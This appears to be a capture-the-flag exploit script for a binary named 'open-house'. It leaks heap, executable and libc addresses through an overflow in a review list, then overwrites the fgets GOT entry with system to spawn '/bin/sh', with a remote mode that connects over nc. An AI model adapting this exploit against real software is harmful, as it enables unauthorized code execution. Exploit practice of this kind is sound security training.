#!/usr/bin/env python3
try:
  from armyknife import *
  from glibc import *
except ImportError:
  from pwn import *

parser = argparse.ArgumentParser()
parser.add_argument("--remote", help="connect to the remote `addr:port`")
args = parser.parse_args()

def connect():
  if args.remote:
    host_port = args.remote.split(":")
    proc = Process(f"nc {host_port[0]} {host_port[1]}", shell=True)
    proc.sendafter(b"Ticket please: ", b"ticket{AppraisalCourtyard4406n23:oLkSpnOkMlaT7yp2aUOsTu_T-0oBrnDFStl3TwUh3qCn8frt}\n")
    return proc
  env = {
    "QEMU_LOG_FILENAME": "./qemu.log",
    "QEMU_STRACE": "1",
  }
  proc = Process("./open-house", env=env, kill_atexit=False)
  print(f"[+] launch process with PID {proc.proc.pid}")
  return proc

proc = connect()

"""
gef➤  checksec ./open-house
Canary                        : ✘ 
NX                            : ✓ 
PIE                           : ✓ 
Fortify                       : ✘ 
RelRO                         : ✘

$ objdump -R ./open-house
./open-house:     file format elf32-i386
DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 
...
00003124 R_386_JUMP_SLOT   free@GLIBC_2.0
00003128 R_386_JUMP_SLOT   fgets@GLIBC_2.0
0000312c R_386_JUMP_SLOT   signal@GLIBC_2.0
...
"""

def create(proc, msg):
  proc.sendafter(b"> ", b"c\n")
  proc.sendafter(b"Absolutely, we'd love to have your review!", msg+b"\n")
def view(proc, idx=None):
  proc.sendafter(b"> ", b"v\n")
  if idx is not None:
    for _ in range(idx):
      proc.recvuntil(b"**** - ")
    return proc.recvuntil(b"\n")
def modify(proc, idx, msg):
  proc.sendafter(b"> ", b"m\n")
  proc.sendafter(b"Which of these reviews should we replace?", f"{idx}\n".encode()+msg+b"\n")
def delete(proc, idx):
  proc.sendafter(b"> ", b"d\n")
  proc.sendafter(b"Which of these reviews should we delete?", f"{idx}\n".encode())

input("Press Any Key")

# Create three entries for safely controlling bi-directional list.
create(proc, b"A"*0x1ff+b"a") # index: 11
create(proc, b"B"*0x1ff+b"b") # index: 12
create(proc, b"C"*0x1ff+b"c") # index: 13

# Leak the base address of heap from the #11 entry.
leak_heap = view(proc, 11)
addrof_next = unpack("I", leak_heap[0x200:][:4])[0]
addrof_prev = unpack("I", leak_heap[0x204:][:4])[0]
print(f"{addrof_next=:#x}")
print(f"{addrof_prev=:#x}")

# Leak the base address of the executable as corrupting #12 entry.
addrof_heap = addrof_prev-0x1430  # we can speculate heap layout completely
print(f"{addrof_heap=:#x}")
addrof_leak = addrof_heap+0x3a0   # prev field of the #0 entry (pointing to addrof_exebase+0x3164)
modify(proc, 12, b"Z"*0x200+pack("I", addrof_leak))
leak_exebase = view(proc, 13)
hexdump(leak_exebase)
addrof_exebase = unpack("I", leak_exebase[4:][:4])[0]-0x3164
print(f"{addrof_exebase=:#x}")
addrof_free = addrof_exebase+0x3124
print(f"{addrof_free=:#x}")

# Leak the address of `free` and `fgets` (GOT entry).
delete(proc, 11)  # call `free` to resolve address
modify(proc, 12, pack("I", addrof_free))
leak_libc = view(proc, 2)
hexdump(leak_libc)
addrof_free, addrof_fgets = unpack("II", leak_libc[:8])
print(f"{addrof_free=:#x}")
print(f"{addrof_fgets=:#x}")

""" local: GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3.1) stable release version 2.35. (/usr/lib/i386-linux-gnu/ld-linux.so.2)
addrof_free=0xf7c98b10
addrof_fgets=0xf7c71690
"""
""" remote
addrof_free=0xf7d6b730
addrof_fgets=0xf7d42de0

We can speculate the version of the remote libc via the compiler string in the executable:

$ strings ./open-house
GCC: (Ubuntu 12.3.0-1ubuntu1) 12.3.0
Ubuntu clang version 15.0.7

Unfortunately, we cannot identify libc version with <https://libc.rip/> or <https://libc.blukat.me/?q=free%3A730%2Cfgets%3Ade0> ...
After searching the keyword `GCC: (Ubuntu 12.3.0-1ubuntu1) 12.3.0`,
according to <https://packages.ubuntu.com/search?keywords=gcc-12>,
the environment might be Ubuntu mantic (devel) or later.
So, the remote libc is <https://launchpad.net/ubuntu/mantic/amd64/libc6-i386/2.37-0ubuntu2>.

$ mkdir libc
$ dpkg -x ./libc6-i386_2.37-0ubuntu2_amd64.deb ./libc
$ strings ./libc/lib32/libc.so.6 | grep version
GNU C Library (Ubuntu GLIBC 2.37-0ubuntu2) stable release version 2.37.
$ objdump -tT ./libc/lib32/libc.so.6 | grep 'free\|fgets\|system'
0006ede0  w   DF .text  000001bc  GLIBC_2.0   fgets
00097730 g    DF .text  000000e5  GLIBC_2.0   free
00049780  w   DF .text  0000003f  GLIBC_2.0   system
"""

# Rewrite the address of `fgets` with the one of `system`
addrof_system = addrof_free + (0x049780 - 0x00097730 if args.remote else 0xf7c48150 - 0xf7c98b10)
print(f"{addrof_system=:#x}")
modify(proc, 2, pack("II", addrof_free, addrof_system)+b"; /bin/sh\n")

proc.interact()
